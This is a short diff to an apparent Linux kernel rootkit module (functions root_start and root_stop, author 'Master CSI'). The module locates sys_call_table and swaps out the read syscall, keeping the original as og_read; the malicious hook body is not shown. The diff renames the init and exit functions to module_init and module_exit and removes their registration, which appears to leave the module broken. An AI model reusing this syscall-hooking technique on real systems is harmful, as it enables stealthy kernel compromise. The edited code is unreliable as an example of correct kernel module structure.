@@ -12,7 +12,6 @@
 #include <linux/types.h>  // size_t
 #include <linux/unistd.h> // read, getuid
 
-
 unsigned long *sys_call_table = 0;
 
 asmlinkage ssize_t (*og_read) (int fd, char *buf, size_t count);
@@ -79,7 +78,7 @@ get_sys_call_table(void)
 }
 
 static int __init
-root_start(void) 
+module_init(void) 
 {
   /* We could use grep sys_call System.map */
   get_sys_call_table();
@@ -93,14 +92,11 @@ root_start(void)
 }
 
 static int __exit
-root_stop(void)
+module_exit(void)
 {
   sys_call_table[__NR_read] = og_read;
   return 0;
 }
-
-module_init(root_start);
-module_exit(root_stop);
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Master CSI");
